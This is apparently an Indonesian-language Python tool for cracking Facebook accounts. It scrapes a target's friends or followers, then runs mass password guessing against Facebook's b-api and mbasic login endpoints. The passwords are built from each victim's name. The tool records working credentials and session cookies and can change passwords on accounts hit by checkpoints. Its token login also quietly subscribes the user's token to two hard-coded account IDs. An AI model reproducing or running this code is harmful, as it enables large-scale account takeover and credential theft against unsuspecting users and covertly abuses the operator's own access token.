
#!/usr/bin/python3
#coding=utf-8

"""

Copyright © 2021 - 2023 | Latip176
Semua codingan dibuat oleh Latip176.

"""

import json, os, re, time
from concurrent.futures import ThreadPoolExecutor as Bool

P = "\x1b[0;97m" 
M = "\x1b[0;91m"
H = "\x1b[0;92m"
K = "\x1b[0;93m"
B = "\x1b[0;94m"

BM = "\x1b[0;96m"

try:
	import requests as req
except:
	print("[{M}!{P}] {BM}Ops! Module requests belum terinstall...\nSedang Menginstall Module...{P}")
	os.system("python3 -m pip install requests")
try:
	from bs4 import BeautifulSoup as par
except:
	print("[{M}!{P}] {BM}Ops! Module bs4 belum terinstall...\nSedang Menginstall Module...{P}")
	os.system("python3 -m pip install bs4")

os.system("clear")

import data as dump
from data import cp_detect as cpp
from data import convert as cv

ok,cp,loop = 0,0,0
cot = ""
nampung, opsi = [], []
ub, pwBaru = [], []

class Main(object):
	
	def __init__(self, token, id, name):
		self.token = token
		self.id = id
		self.name = name
	def banner(self):
		banner = f"""
_________  ________  __      __________  
\_   ___ \ \_____  \/  \    /  \_____  \ 
/    \  \/  /   |   \   \/\/   / _(__  < 
\     \____/    |    \        / /      
\
 \______  /\_______  /\__/\  / /______  /
        \/         \/      \/         \/ 
	Version: {BM}0.1.4{P}
  Coded by: Latip176, Sponsore: Fatah Sewu
		"""
		return banner
	def cpdetect(self):
		__data=input("[?] Masukan nama file: ")
		try:
			_file=open("results/"+__data,"r").readlines()
		except FileNotFoundError:
			exit("[!] File tidak ditemukan")
		ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
		if ww in ("y","ya"):
			pwBar=input("[+] Masukan pw baru: ")
			ub.append("y")
			if len(pwBar) <= 5:
				exit("Password harus lebih dari 6 character!")
			else:
				pwBaru.append(pwBar)
		cpp.Eksekusi("https://mbasic.facebook.com",_file,"file","".join(pwBaru),"".join(ub))
	def proses(self):
		print("")
		op = input(f"[{K}?{P}] Munculkan opsi cp [y/t]: ")
		if op in ("y","Y"):
			opsi.append("y")
			ww=input(f"[{K}?{P}] Ubah pw ketika tap yes [y/t]: ")
			if ww in ("y","ya"):
				pwBar=input(f"[{H}+{P}] Masukan pw baru: ")
				ub.append("y")
				if len(pwBar) <= 5:
					exit(f"{M}Password harus lebih dari 6 character!{P}")
				else:
					pwBaru.append(pwBar)
			else:
				print("> Skipped")
		print(f"\n[{BM}!{P}] Akun hasik ok di save di ok.txt\n[{BM}!{P}] Akun hasil cp di save di cp.txt\n")

class Data(Main):
	
	def menu(self):
		os.system("clear")
		print(self.banner())
		print(f" * Welcome {self.name} in tool! Pilih crack dan mulai.")
		print(f"[{BM}1{P}]. Crack dari pertemanan publik\n[{BM}2{P}]. Crack dari followers publik\n[{BM}3{P}]. Checkpoint detector\n[{M}0{P}]. Logout akun (hapus token)\n")
		_chose = input(f"[{K}?{P}] Chose: ")
		__pilih = ["01","1","02","2","03","3","0"]
		while _chose not in __pilih:
			print("\n[!] Pilihan tidak ada")
			_chose = input("[?] Chose: ")
		print("")
		if _chose in ("01","1"):
			print(f"[{BM}!{P}] Ketik {BM}'me'{P} untuk teman list kamu")
			__id = input(f"[{K}?{P}] Masukan username atau id target: ").replace("'me'","me")
			if(re.findall("\w+",__id)):
				if(__id not in ("me","'me'")):
					r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text
					try:
						id = re.findall('\;rid\=(\d+)\&',str(r))[0]
					except:
						exit(f"{M}[!] Ops! Username tidak ditemukan.{P}")
					self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(id)
				else:
					self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id)
			else:
				self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id)
			self.submit(self.data)
		elif _chose in ("02","2"):
			print(f"[{BM}!{P}] Ketik {BM}'me'{P} untuk followers list kamu")
			__id = input(f"[{K}?{P}] Masukan username atau id target: ").replace("'me'","me")
			if(re.findall("\w+",__id)):
				if(__id not in ("me","'me'")):
					r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text
					try:
						id = re.findall('\;rid\=(\d+)\&',str(r))[0]
					except:
						exit(f"{M}[!] Ops! Username tidak ditemukan.{P}")
					self.data = dump.Dump("https://graph.facebook.com",self.token).followers(id)
				else:
					self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id)
			else:
				self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id)
			self.submit(self.data)
		elif _chose in ("03","3"):
			self.cpdetect()
		elif _chose in ("0","00"):
			os.system("rm -rf data/save.txt")
			exit(f"{H}Thanks You....{P}\n")
		else:
			print(f"{M}[×] Kesalahan...{P}")
	
	def submit(self,data):
		print(f"\n[!] Pilih Metode Crack\n[{BM}1{P}] Metode b-api\n[{BM}2{P}] Metode mbasic")
		metode = input(f"[{K}?{P}] Chose: ")
		print(f"\n[!] D: {B}Default, {P}M: {BM}Manual, {P}G: {H}Gabung. {P}")
		pasw=input(f"[{K}?{P}] Password [d/m/g]: ")
		if pasw in ("m","M","g","G"):
			print(f"[{BM}!{P}] Pisahkan password menggunakan koma contoh (sayang,bangsad)")
			tam = input(f"[{H}+{P}] Masukan password: ").split(",")
		self.proses()
		print(" * Crack dimulai... CTRL + Z untuk stop! \n * Nyalakan mode pesawat jika tidak mendapatkan hasil\n")
		with Bool(max_workers=35) as kirim:
			for __data in data:
				nama,id = __data.split("<=>")
				nampung.append(id)
				if(len(nama)>=6):
					pwList = [nama,nama+"123",nama+"1234",nama+"12345"]
				elif(len(nama)<=2):
					pwList = [nama+"1234",nama+"12345"]
				elif(len(nama)<=5):
					pwList = [nama+"123",nama+"1234",nama+"12345"]
				else:
					pwList = [nama,nama+"123",nama+"1234",nama+"12345"]
				if pasw in ("d","D"):
					pwList = pwList
				elif pasw in ("m","M"):
					pwList = tam
				elif pasw in ("g","G"):
					pwList = pwList + tam
				else:
					pwList = pwList
				if metode in ("01","1"):
					kirim.submit(Crack(self.token,self.id,self.name).b_api,"https://b-api.facebook.com",id,pwList)
				else:
					kirim.submit(Crack(self.token,self.id,self.name).mbasic,"https://mbasic.facebook.com",id,pwList)
		exit("[!] Crack selesai....")

class Crack(Main):
	
	def b_api(self,url,user,pwList):
		global ok,cp,cot,loop
		if user!=cot:
			cot=user
			loop+=1
		session = req.Session()
		session.headers.update({
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"cache-control":"max-age=0",
			"sec-sh-ua":'";Not A Brand";v="99", "Chromium";v="94"',
			"sec-ch-ua-mobile":"?1",
			"sec-ch-ua-platform":"Android",
			"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		for pw in pwList:
			pw=pw.lower()
			response = session.get(url+"/method/auth.login",params={'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'id_ID', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'})
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response.text:
				print("\r[!] Opss! Terkena spam... nyalakan mode pesawat selama 2 detik!\n",end="")
				continue
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				print(f"\r\r\33[32;1m[OK] {user} | {pw} | {response.json()['access_token']}\n\33[37;1m",end="")
				open("results/ok.txt","a").write(user+"|"+pw+"\n")
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				_file = user+"|"+pw
				if "y" in opsi:
					cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
				else:
					print(f"\r\33[1;33m[CP] {user} | {pw}          ∆\33[37;1m\n",end="")
				open("results/cp.txt","a").write(user+"|"+pw+"\n")
				break
			else:
				continue
		print(f"\r[=] {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	",end="")
		
	def mbasic(self,url,user,pwList):
		global loop, ok, cp, cot
		if user!=cot:
			cot=user
			loop+=1
		data={}
		session = req.Session()
		session.headers.update({
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
		"cache-control":"max-age=0",
		"referer":"https://mbasic.facebook.com/",
		"sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
		"sec-ch-mobile":"?1",
		"sec-ch-ua-platform":'"Android"',
		"sec-fetch-dest":"document",
		"sec-fetch-mode":"navigate",
		"sec-fetch-site":"same-origin",
		"sec-fetch-user":"?1",
		"upgrade-insecure-requests":"1",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		for pw in pwList:
			pw = pw.lower()
			soup = par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
			link = soup.find("form",{"method":"post"})
			lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for __data in soup.find_all("input"):
				if __data.get("name") in lsd:
					data.update({__data.get("name"):__data.get("value")})
				data.update({"email":user,"pass":pw})
			try:
				response = session.post(url+link.get("action"),data=data)
			except:
				exit("Ganti useragent!")
			if "c_user" in session.cookies.get_dict():
				if "Akun Anda Dikunci" in response.text:
					print(f"\r\33[31;1m[CP] {user} | {pw} -> SESI NEW\n\33[37;1m",end="")
				else:
					ok+=1
					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
					print(f"\r\33[32;1m[OK] {user}|{pw}|{coki}\n\33[37;1m",end="")
					print(f"[{H}+{P}] Apk yang terkait:")
					cpp.Eksekusi("","","","","").cek_apk(session,coki)
					open("results/ok.txt","a").write(user+"|"+pw+"\n")
					break
			elif "checkpoint" in session.cookies.get_dict():
				title = re.findall("\<title>(.*?)<\/title>",str(response.text))
				if "Masukkan Kode Masuk untuk Melanjutkan" in title:
					print(f"\r\33[31;1m[CP] {user} | {pw} -> A2F ON\n\33[37;1m",end="")
				else:
					cp+=1
					_file = user+"|"+pw
					if "y" in opsi:
						cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
					else:
						if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
							print(f"\r\33[32;1m[OK] {user} | {pw} -> Tap Yes\n\33[37;1m",end="")
						else:
							print(f"\r\33[1;33m[CP] {user} | {pw}          ∆\33[37;1m\n",end="")
					open("results/cp.txt","a").write(user+"|"+pw+"\n")
				break
			else:
				if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
					print("\r\33[31;1m[!] hidupkan mode pesawat selama 2 detik \33[37;1m\n",end="")
					continue
				else:
					pass
			print(f"\r[=] {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	",end="")
	
def login():
	os.system("clear")
	logo_login = """\n
.##.......####....####...######..##..##.
.##......##..##..##........##....###.##.
.##......##..##..##.###....##....##.###.
.##......##..##..##..##....##....##..##.
.######...####....####...######..##..##.
........................................
	"""
	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies [Rawan Sesi New]\n[2]. Login menggunakan token")
	bingung = input("\n[?] Login menggunakan: ")
	__pilihan = ["01","1","02","2"]
	while bingung not in __pilihan:
		print("\n[!] Pilihan tidak ada")
		bingung = input("[?] Login menggunakan: ")
	if bingung in ("01","1"):
		__cokiee = input("[?] cookie\t: ")
		__coki = cv.Main(__cokiee).getToken()
		if "EAA" in __coki:
			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
			_id = _cek['id']
			_nama = _cek['name']
			input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
			open("data/save.txt","a").write(__coki)
			Data(__coki,_id,_nama).menu()
		elif "Cookies Invalid" in __coki:
			exit("\n[!] Cookies Invalid")
		else:
			exit("\n[!] Kesalahan")
	elif bingung in ("02","2"):
		__token = input("[?] token\t: ")
		try:
			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
			_nama = __res['name']
			_id = __res['id']
			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
			input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
			open("data/save.txt","a").write(__token)
			Data(__token, _id, _nama).menu()
		except KeyError:
			print("\n[!] token invalid")
	
	
if __name__=="__main__":
	try:
		__token = open("data/save.txt","r").read()
		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
		_nama = __res['name']
		_id = __res['id']
		print(f" * Welcome back {_nama}\n * Menuju menu...")
		time.sleep(3)
		Data(__token, _id, _nama).menu()
	except KeyError:
		os.system("rm -rf data/save.txt")
		print("\n[!] token invalid")
	except FileNotFoundError:
		print("[!] belum login\n * Menuju ke menu login...")
		time.sleep(3)
		login()
